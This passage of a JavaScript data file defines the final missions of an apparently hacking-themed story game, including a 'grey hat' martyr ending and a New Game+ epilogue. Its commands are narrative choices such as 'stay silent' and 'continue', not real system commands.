    {
        id: 98, name: 'The Martyr', description: 'Die for the cause.',
        story: 'They find you. You won\'t talk.',
        target: 'choice', 
        command: 'stay silent',
        hint1: 'Refuse to talk', hint2: 'Grey hat ending',
        explanation: 'You become a symbol.',
        output: 'You died. Your face is on protest signs.',
        darkKnowledge: 'Grey Hat ending 3/3',
        reward: 2140, requiredLevel: 98, act: 5, chapter: 20, path: 'grey'
    },
    
    // EPILOGUE (99-100) - Available to all paths
    {
        id: 99, name: 'The Legacy', description: 'Reflect on your journey.',
        story: 'Look back at everything you\'ve learned.',
        target: 'memory', 
        command: 'reflect',
        hint1: 'Look back', hint2: 'Think about your path',
        explanation: 'Your choices made you who you are.',
        output: 'You\'ve completed 100 missions. The world is different because of you.',
        darkKnowledge: 'Every ending is just another beginning.',
        reward: 5000, requiredLevel: 99, act: 5, chapter: 20, path: 'all'
    },
    {
        id: 100, name: 'The Beginning', description: 'The cycle continues.',
        story: 'A new message appears. "The grid needs you again."',
        target: 'terminal', 
        command: 'continue',
        hint1: 'Type continue', hint2: 'Start new game+',
        explanation: 'New Game+ unlocks.',
        output: 'Your journey continues... with all your knowledge.',
        darkKnowledge: 'NG+ has harder missions and darker secrets.',
        reward: 10000, requiredLevel: 100, act: 5, chapter: 20, path: 'all'
    }
];

console.log('✅ Missions loaded:', window.MISSIONS.length);